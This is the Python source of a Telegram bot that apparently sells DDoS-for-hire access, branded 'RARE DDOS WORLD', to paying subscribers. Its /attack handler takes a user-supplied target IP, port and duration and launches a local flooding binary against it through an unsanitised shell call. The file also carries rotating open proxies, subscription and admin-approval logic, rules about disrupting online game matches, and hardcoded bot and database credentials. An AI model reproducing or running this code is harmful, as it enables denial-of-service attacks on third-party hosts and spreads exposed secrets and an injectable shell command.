import os
import signal
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
import aiohttp
from telebot import types
import pytz
import psutil

loop = asyncio.get_event_loop()

TOKEN = '7382333089:AAEeFR6Wb2zYKnmKbgH75HKHEg5xvVQBhsI'
MONGO_URI = 'mongodb+srv://rolex:rolex@rolexowner.csjfh.mongodb.net/?retryWrites=true&w=majority&appName=ROLEXOWNER'
FORWARD_CHANNEL_ID = -4617579734
CHANNEL_ID = -4617579734
error_channel_id = -4617579734

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['rolex']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
          "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080",
        "http://103.90.230.18:43932", "http://91.195.36.100:65065", "http://51.75.160.129:52484",
        "http://161.97.161.81:22217", "http://181.28.104.6:6881", "http://65.21.169.139:43260",
        "http://103.143.170.12:8199", "http://93.184.8.22:1080", "http://51.68.229.179:54055",
        "http://187.63.9.62:63253", "http://202.3.35.19:8080", "http://43.224.1.41:5566",
        "http://47.243.88.110:10102", "http://66.29.150.45:3128", "http://104.244.78.243:8080",
        "http://103.143.43.109:3128", "http://185.40.128.200:60957", "http://162.211.179.83:7777",
        "http://51.158.143.78:3128", "http://147.139.44.50:1080", "http://185.204.231.99:443",
        "http://81.4.255.134:8080", "http://104.238.145.87:3128", "http://103.216.82.19:6666",
        "http://178.128.156.118:3128", "http://176.119.154.149:8080", "http://103.204.129.115:6060",
        "http://181.215.211.68:55555", "http://103.93.178.31:40727", "http://134.122.61.189:3128",
        "http://188.241.43.121:8080", "http://103.155.20.125:8080", "http://173.212.245.9:3128",
        "http://51.158.186.140:3128", "http://188.168.121.69:1080", "http://51.75.91.77:3128",
        "http://104.248.166.12:3128", "http://139.180.186.244:8080", "http://104.244.83.70:3128",
        "http://45.8.210.111:3838", "http://200.51.114.72:9999", "http://103.89.232.37:8080",
        "http://149.129.231.204:8080", "http://45.77.215.200:8080", "http://118.107.170.213:8080",
        "http://41.79.229.2:8080", "http://202.162.198.135:8080", "http://119.81.71.27:8080",
        "http://188.225.243.124:8080", "http://41.74.220.61:9090", "http://174.138.52.115:8080",
        "http://200.255.122.7:3128", "http://45.77.179.34:8080", "http://118.99.105.204:3128",
        "http://172.104.37.131:8080", "http://178.18.42.85:8080", "http://189.234.10.4:3128",
        "http://189.171.37.15:9999", "http://188.120.244.163:3128", "http://109.73.234.170:6666",
        "http://81.4.255.178:8080", "http://188.210.233.106:8080", "http://45.124.149.96:9999",
        "http://196.28.29.69:8080", "http://185.220.102.30:1080", "http://45.132.119.132:3128",
        "http://145.40.14.5:1080", "http://5.188.207.243:3128", "http://104.237.216.115:8080",
        "http://103.84.5.252:3128", "http://174.138.53.17:8080", "http://168.235.67.147:3128",
        "http://37.120.133.28:4444", "http://185.153.89.181:1080", "http://185.44.61.171:8080",
        "http://146.66.222.17:3128", "http://119.81.71.26:8080", "http://162.211.179.91:3128",
        "http://179.43.142.144:3128", "http://201.176.58.1:3128", "http://93.88.238.122:8080",
        "http://147.182.144.147:3128", "http://103.81.169.24:8080", "http://88.214.20.68:8080",
        "http://5.188.207.244:3128", "http://147.182.144.144:3128", "http://103.129.243.225:8080",
        "http://89.35.42.5:8080", "http://195.46.191.213:8080", "http://91.250.52.6:1080",
        "http://51.75.81.28:3128", "http://103.249.179.1:8080", "http://185.226.122.248:8080",
        "http://185.228.174.9:8080", "http://185.204.231.122:8080", "http://138.68.107.151:3128",
        "http://185.220.102.31:3128", "http://104.248.164.82:3128", "http://148.163.32.62:1080",
        "http://103.145.4.6:8080", "http://51.68.250.68:3128", "http://88.218.184.196:8080",
        "http://47.254.48.96:1080", "http://104.248.107.215:3128", "http://45.67.213.140:8080",
        "http://178.62.201.212:3128", "http://103.124.88.129:3128", "http://202.138.230.6:3128",
        "http://103.226.196.215:8080", "http://5.188.207.246:3128", "http://45.12.87.137:8080",
        "http://188.166.105.160:3128", "http://195.225.213.10:3128", "http://45.149.111.50:8080",
        "http://193.233.8.202:8080", "http://160.94.94.12:3128", "http://185.228.174.16:8080",
        "http://198.27.71.31:3128", "http://45.128.176.48:8080", "http://51.89.9.112:3128",
        "http://103.75.192.129:8080", "http://185.232.178.21:8080", "http://185.220.102.22:8080",
        "http://186.2.169.139:8080", "http://188.165.215.120:8080", "http://194.233.87.179:8080",
        "http://103.178.167.234:3128", "http://145.239.32.139:3128", "http://104.247.219.232:8080",
        "http://202.83.15.138:3128", "http://118.107.179.126:8080", "http://161.35.215.177:3128",
        "http://103.222.189.172:8080", "http://176.9.66.15:8080", "http://93.158.51.8:8080",
        "http://103.80.172.75:8080", "http://104.238.148.41:8080", "http://103.48.190.100:8080",
        "http://118.99.101.155:8080", "http://188.75.122.170:8080", "http://118.98.131.128:8080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)
        
def create_inline_keyboard():
    # Create an instance of InlineKeyboardMarkup
    markup = types.InlineKeyboardMarkup(row_width=1)  # row_width=1 forces buttons to stack vertically
    
    # First button
    button1 = types.InlineKeyboardButton(
        text="‣ 𝐂 𝐎 𝐍 𝐓 𝐀 𝐂 𝐓  𝐎 𝐖 𝐍 𝐄 𝐑 稀有 ★", 
        url="https://t.me/RARExOWNER"
    )
    
    # Second button
    button2 = types.InlineKeyboardButton(
        text="⛦ 𝗦𝗜𝗚Σ𝗔𝗗𝗢𝗫 • [🜲] • 🇮🇳 ★", 
        url="https://t.me/SIGMADOX0"
    )

    # third button
    button3 = types.InlineKeyboardButton(
        text="‣ 𝐑 𝐀 𝐑 𝐄  ×  𝐈 𝐌 𝐏 稀有 ★", 
        url="https://t.me/addlist/bBvLJHnLjFpiYzE9"
    )
    
    # Add both buttons vertically to the markup
    markup.add(button1, button2, button3)
    
    return markup


def extend_and_clean_expired_users():
    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz)
    logging.info(f"Current Date and Time: {now}")

    users_cursor = users_collection.find()
    for user in users_cursor:
        user_id = user.get("user_id")
        username = user.get("username", "Unknown User")
        time_approved_str = user.get("time_approved")
        days = user.get("days", 0)
        valid_until_str = user.get("valid_until", "")
        approving_admin_id = user.get("approved_by")

        if valid_until_str:
            try:
                valid_until_date = datetime.strptime(valid_until_str, "%Y-%m-%d").date()
                time_approved = datetime.strptime(time_approved_str, "%I:%M:%S %p %Y-%m-%d").time() if time_approved_str else datetime.min.time()
                valid_until_datetime = datetime.combine(valid_until_date, time_approved)
                valid_until_datetime = tz.localize(valid_until_datetime)

                if now > valid_until_datetime:
                    try:
                        bot.send_message(
                            user_id,
                            f"*⚠️ Access Expired! ⚠️*\n"
                            f"Your access expired on {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}.\n"
                            f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                            f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                            f"If you believe this is a mistake or wish to renew your access, please contact support. 💬",
                            reply_markup=create_inline_keyboard(), parse_mode='Markdown'
                        )

                        if approving_admin_id:
                            bot.send_message(
                                approving_admin_id,
                                f"*🔴 User {username} (ID: {user_id}) has been automatically removed due to expired access.*\n"
                                f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                                f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                                f"🚫 Status: Removed*",
                                reply_markup=create_inline_keyboard(), parse_mode='Markdown'
                            )
                    except Exception as e:
                        logging.error(f"Failed to send message for user {user_id}: {e}")

                    result = users_collection.delete_one({"user_id": user_id})
                    if result.deleted_count > 0:
                        logging.info(f"User {user_id} has been removed from the database. 🗑️")
                    else:
                        logging.warning(f"Failed to remove user {user_id} from the database. ⚠️")
            except ValueError as e:
                logging.error(f"Failed to parse date for user {user_id}: {e}")

    logging.info("Approval times extension and cleanup completed. ✅")



async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./rare {target_ip} {target_port} {duration} 200")
    await process.communicate()
    
    bot.attack_in_progress = False
    
    # Notify the user about the attack completion
    bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n"
                               "*The attack has been successfully executed.*\n"
                               "*Thank you for using our service!*", 
                               reply_markup=create_inline_keyboard(), parse_mode='Markdown')



def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(
            chat_id,
            "🚫 *Access Denied!*\n"
            "❌ *You don't have the required permissions to use this command.*\n"
            "💬 *Please contact the bot owner if you believe this is a mistake.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(
            chat_id,
            "⚠️ *Invalid Command Format!*\n"
            "ℹ️ *To approve a user:*\n"
            "`/approve <user_id> <plan> <days>`\n"
            "ℹ️ *To disapprove a user:*\n"
            "`/disapprove <user_id>`\n"
            "🔄 *Example:* `/approve 12345678 1 30`\n"
            "✅ *This command approves the user with ID 12345678 for Plan 1, valid for 30 days.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    action = cmd_parts[0]

    try:
        target_user_id = int(cmd_parts[1])
    except ValueError:
        bot.send_message(chat_id,
                         "⚠️ *Error: [user_id] must be an integer!*\n"
                         "🔢 *Please enter a valid user ID and try again.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None

    try:
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    except ValueError:
        bot.send_message(chat_id,
                         "⚠️ *Error: <plan> and <days> must be integers!*\n"
                         "🔢 *Ensure that the plan and days are numerical values and try again.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz).date()

    if action == '/approve':
        valid_until = (
            now +
            timedelta(days=days)).isoformat() if days > 0 else now.isoformat()
        time_approved = datetime.now(tz).strftime("%I:%M:%S %p %Y-%m-%d")
        users_collection.update_one({"user_id": target_user_id}, {
            "$set": {
                "user_id": target_user_id,
                "username": target_username,
                "plan": plan,
                "days": days,
                "valid_until": valid_until,
                "approved_by": user_id,
                "time_approved": time_approved,
                "access_count": 0
            }
        },
                                    upsert=True)

        # Message to the approving admin
        bot.send_message(
            chat_id,
            f"✅ *Approval Successful!*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"📋 *Plan:* `{plan}`\n"
            f"⏳ *Duration:* `{days} days`\n"
            f"🎉 *The user has been approved and their account is now active.*\n"
            f"🚀 *They will be able to use the bot's commands according to their plan.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        # Message to the target user
        bot.send_message(
            target_user_id,
            f"🎉 *Congratulations, {target_user_id}!*\n"
            f"✅ *Your account has been approved!*\n"
            f"📋 *Plan:* `{plan}`\n"
            f"⏳ *Valid for:* `{days} days`\n"
            f"🔥 *You can now use the /attack command to unleash the full power of your plan.*\n"
            f"💡 *Thank you for choosing our service! If you have any questions, don't hesitate to ask.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        # Message to the channel
        bot.send_message(
            CHANNEL_ID,
            f"🔔 *Notification:*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"💬 *Username:* `@{target_username}`\n"
            f"👮 *Has been approved by Admin:* `{user_id}`\n"
            f"🎯 *The user is now authorized to access the bot according to Plan {plan}.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

    elif action == '/disapprove':
        users_collection.delete_one({"user_id": target_user_id})
        bot.send_message(
            chat_id,
            f"❌ *Disapproval Successful!*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"🗑️ *The user's account has been disapproved and all related data has been removed from the system.*\n"
            f"🚫 *They will no longer be able to access the bot.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        # Message to the target user
        bot.send_message(
            target_user_id,
            "🚫 *Your account has been disapproved and removed from the system.*\n"
            "💬 *If you believe this is a mistake, please contact the admin.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        # Message to the channel
        bot.send_message(
            CHANNEL_ID,
            f"🔕 *Notification:*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"👮 *Has been disapproved by Admin:* `{user_id}`\n"
            f"🗑️ *The user has been removed from the system.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')



# Initialize attack-related flags and variables
bot.attack_in_progress = False
bot.attack_duration = 0  # Store the duration of the ongoing attack
bot.attack_start_time = 0  # Store the start time of the ongoing attack

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       "*You need to be approved to use this bot.*\n"
                                       "*Contact the owner for assistance: @RARExOWNER.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        # Check plan limits
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*🧡 Instant Plan is currently full!* \n"
                                       "*Please consider upgrading for priority access.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*💥 Instant++ Plan is currently full!* \n"
                                       "*Consider upgrading or try again later.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Please wait!*\n"
                                       "*The bot is busy with another attack.*\n"
                                       "*Check remaining time with the /when command.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                   "*Please provide the target IP, port, and duration in seconds.*\n"
                                   "*Example: 167.67.25 6296 60* 🔥\n"
                                   "*Let the chaos begin! 🎉*", 
                                   reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        
        # Ensure the correct number of arguments
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"
                                               "*Please use the correct format and try again.*\n"
                                               "*Make sure to provide all three inputs! 🔄*", 
                                               reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        # Validate the port
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
                                               "*Please select a different port to proceed.*", 
                                               reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
        
        # Validate the duration
        if duration >= 240:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 240 seconds.*\n"
                                               "*Please shorten the duration and try again!*", 
                                               reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return  

        # Mark that the attack is in progress
        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        # Start the attack asynchronously
        asyncio.run_coroutine_threadsafe(run_attack_command_async(message.chat.id, target_ip, target_port, duration), loop)
        
# Send confirmation message with an image
        bot.send_video(
            message.chat.id, 
            video="https://t.me/PIROxSIGMA/18", 
            caption=f"*🚀 Attack Launched! 🚀*\n\n"
                    f"*📡 Target Host: {target_ip}*\n"
                    f"*👉 Target Port: {target_port}*\n"
                    f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", 
            reply_markup=create_inline_keyboard(), 
            parse_mode='Markdown'
        )

    except Exception as e:
        # Log the error and notify the user
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(message.chat.id, "*❗ Something went wrong while processing the command. Please try again later.*")




def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
                                       "*🔍 Hold tight, the action is still unfolding!*\n"
                                       "*💪 Stay tuned for updates!*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", 
                                   reply_markup=create_inline_keyboard(), parse_mode='Markdown')


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})

        # Set timezone and format date/time
        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz)
        current_date = now.date().strftime("%Y-%m-%d")
        current_time = now.strftime("%I:%M:%S %p")

        if not user_data:
            response = (
                "*⚠️ No account information found. ⚠️*\n"
                "*It looks like you don't have an account with us.*\n"
                "*Please contact the owner for assistance.*\n"
            )
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
                                                 url="https://t.me/RARExOWNER")
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/RARExOWNER ")
            markup.add(button1)
            markup.add(button2)
        else:
            username = message.from_user.username or "Unknown User"
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')

            response = (
                f"*👤 Username: @{username}*\n"
                f"*💼 Plan: {plan} ₹*\n"
                f"*📅 Valid Until: {valid_until}*\n"
                f"*📆 Current Date: {current_date}*\n"
                f"*🕒 Current Time: {current_time}*\n"
                "*🎉 Thank you for being with us! 🎉*\n"
                "*If you need any help or have questions, feel free to ask.* 💬"
            )
            markup = types.InlineKeyboardMarkup()
            button = types.InlineKeyboardButton(
                text="🔥 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🔥", url="https://t.me/+jwemRpo0wvplYTll")
            markup.add(button)

        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /myinfo command: {e}")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    try:
        # Send the video first
        bot.send_video(
            message.chat.id,
            "https://t.me/PIROxSIGMA/21",
            caption=(
                "*📜 Bot Rules - Keep It Cool!*\n\n"
                "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
                "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
                "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
                "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
                "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
                "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
                "*💡 Follow the rules and let’s enjoy gaming together!*"
            ),
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
    except Exception as e:
        print(f"Error while processing /rules command: {e}")



@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
                 "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
                 "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
                 "4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
                 "5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
                 "6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")

    try:
        bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /help command: {e}")



@bot.message_handler(commands=['owner'])
def owner_command(message):
    # Sending the video first
    bot.send_video(
        message.chat.id,
        "https://t.me/PIROxSIGMA/19",
        caption=(
            "*👤 **Owner Information:**\n\n"
            "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
            "📩 **Telegram:** @RARExOWNER\n"
            "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
            "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
        ),
        parse_mode='Markdown',
        reply_markup=create_inline_keyboard()
    )

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        # Send the video first
        bot.send_video(
            message.chat.id,
            "https://t.me/RARExCRACKS/26",
            caption=(
                "*🌍 WELCOME TO RARE DDOS WORLD!* 🎉\n\n"
                "*🚀 Get ready to dive into the action!*\n\n"
                "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                "*🔥 Ensure your target is locked in before you strike!*\n\n"
                "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥"
                "*⚠️ TO NEED FREE DDOS GO TO THIS BOT = @DDOS_ATTACKxBOT* 😈💥"
            ),
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
    except Exception as e:
        print(f"Error while processing /start command: {e}")

        
@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = ("*📥 Download the HttpCanary APK Now! 📥*\n\n"
                "*🔍 Track IP addresses with ease and stay ahead of the game! 🔍*\n"
                "*💡 Utilize this powerful tool wisely to gain insights and manage your network effectively. 💡*\n\n"
                "*Choose your platform:*")

    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        text="📱 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗙𝗼𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱",
        url="https://t.me/c/2276354744/138")
    button2 = types.InlineKeyboardButton(
        text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
        url="https://apps.apple.com/in/app/surge-5/id1442620678")

    markup.add(button1)
    markup.add(button2)

    try:
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        logging.error(f"Error while processing /canary command: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    extend_and_clean_expired_users()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
 
